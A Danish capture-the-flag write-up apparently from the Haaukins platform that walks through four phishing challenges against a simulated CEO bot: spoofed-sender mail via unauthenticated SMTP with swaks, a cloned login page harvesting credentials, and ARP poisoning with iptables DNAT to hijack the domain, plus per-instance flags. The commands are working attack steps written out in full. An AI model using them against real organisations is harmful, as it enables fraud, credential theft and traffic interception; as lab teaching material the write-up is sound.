Phishing-serien (CryptoBanker)

En CEO-bot der "clicks anything containing http://": klik-link, credential-harvest og domæne-kapring.

Web exploitationHaaukins CTF
🎓 Prøv selv først. Trinnene viser metoden, det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er fremgangsmåden der tæller.

Opsætning: hvorfor Kali (ikke VPN)

Mål: CEO-bot'en reynash@cryptobanker.com (forsiden: Reynash Bihar = CEO; kolleger xi@, david@). Hosts: cryptobanker.com (HTTPS-login POST /login) + mail.cryptobanker.com (Exim SMTP :25, ingen auth).

CEO-bot'en kan ikke nå din VPN-klient-IP (route-back), men ligger på samme subnet som Kali-Toolbox'en, så host/MITM on-segment fra Kali. Mail sendes med swaks, og bot'en "clicks anything containing http://". Når den klikker, laver den GET <link>?flag_1=...&flag_2=... og auto-appender phish-2- og phish-3-flaget.

phish-2 + phish-3: én mail løser begge

Host en logger (python3 -m http.server 8000) og mail CEO'en et link fra en @cryptobanker.com-afsender:

swaks --server mail.cryptobanker.com:25 --to reynash@cryptobanker.com \
  --from "security@cryptobanker.com" --body "...: http://<kali-ip>:8000/x"

Bot'en klikker → GET /x?flag_1=...&flag_2=...:

  • flag_1 = phish-2 (Convince visitation: han besøgte din URL).
  • flag_2 = phish-3 (Impersonate colleague: afsenderen var @cryptobanker.com = "seems to come from the company"). SMTP uden auth = triviel afsender-spoofing.

phish-1: Abuse credentials (falsk login-form)

Host en 1:1-kopi af den ægte login-form på Kali. Vigtigt: samme id="username"/id="password"/id="submit" som originalen. En minimal form uden id'erne bliver ikke udfyldt af bot'ens form-filler. Loggeren gemmer POST-body. Mail CEO'en et "session expired, log in"-link → bot'en udfylder og sender sine egne creds:

*** POST /login  username=reynash&password=mommaBeProud-1978 ***

Brug dem på den ægte side → flaget på den autentificerede side:

curl -sk -L -d "username=reynash&password=mommaBeProud-1978" \
  https://cryptobanker.com/login | grep -o 'HKN{[^}]*}'

phish-4: Hijack domain (ARP-spoof + DNAT)

Dynamic DNS-update = NOTIMP, og DNS-spoofing virker ikke (CEO-bot'en bruger Docker-intern DNS, ikke lab-resolveren). Løsning = L3-interception (DNS-agnostisk):

# 1) ARP-poison CEO'en: web-serveren .245 (cryptobanker) is-at Kali's MAC  (scapy, hvert 2. sek)
# 2) sudo sysctl -w net.ipv4.ip_forward=1
# 3) sudo iptables -t nat -A PREROUTING -p tcp -d <web-ip> --dport 80 \
#        -j DNAT --to-destination <kali-ip>:80
# 4) host fake-cryptobanker paa Kali :80
# 5) mail CEO'en  http://cryptobanker.com   (cachet -> .245 -> ARP+DNAT -> din fake)

→ GET / Host: cryptobanker.com ?flag_1=...&flag_3=...&flag_2=...: flag_3 = phish-4 (dukker kun op for det kaprede apex-cryptobanker.com, ikke www). Ryd op bagefter: iptables -t nat -F, ip_forward=0, stop ARP-poisoning.

🚩 Vis løsning & eksempel-flag

Flag (per-instans) pr. opgave:

  • phish-2 Convince visitation HKN{wn-w3i-1y2nR} · phish-3 Impersonate colleague HKN{Iz-od-SoGwPT}
  • phish-1 Abuse credentials HKN{C7N-zk-HOchD} · phish-4 Hijack domain HKN{E77-cZ-qovJU}

Hvad du har lært

  • Route-back-blokeringen gælder kun VPN-klient-IP'en; på lab-subnettet (Kali-Toolbox) kan offer-bots nå dig, host/MITM on-segment.
  • Studér den ægte artefakt før du forfalsker den: bot'ens form-filler krævede eksakte id-attributter (1:1-kopi).
  • Når DNS-spoofing fejler (offeret bruger en intern/anden resolver), så MITM på L3: ARP-spoof mål-IP'en + iptables DNAT, uafhængigt af DNS og DNS-cache.
  • SMTP uden auth = triviel afsender-spoofing; en @firma.com-afsender løser "impersonate"-delen gratis.

Hvor ses dette igen?

Phishing er stadig den mest effektive angrebsvektor i den virkelige verden, og de fire trin her afspejler ægte teknikker: SMTP uden afsender-autentificering (SPF/DKIM/DMARC) gør afsender-spoofing trivielt, en pixel-perfekt kopi af login-siden høster credentials, og når ét lag (DNS-spoofing) fejler, falder man ned på et lavere (ARP + L3-redirect). Den vigtigste generelle lektie: studér den ægte artefakt før du forfalsker den, bot'ens form-filler krævede eksakte HTML-id'er, præcis som en overbevisende phishing-side skal matche originalen pixel for pixel. Og ryd altid op efter aktive MITM-ændringer.
